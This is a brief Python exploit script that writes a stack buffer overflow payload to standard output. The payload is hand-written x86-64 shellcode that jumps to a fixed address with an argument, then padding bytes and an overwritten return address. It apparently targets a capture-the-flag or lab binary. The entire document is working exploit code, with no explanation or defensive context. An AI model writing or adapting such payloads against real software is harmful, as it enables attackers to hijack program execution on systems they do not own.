import sys

shellcode = b"\xbf\x04\x00\x00\x00\xb8\x87\x1a\x40\x00\xff\xe0"
payload = shellcode + b"A" * 12 + (0x721000800fd0).to_bytes(8, "little")
sys.stdout.buffer.write(payload)
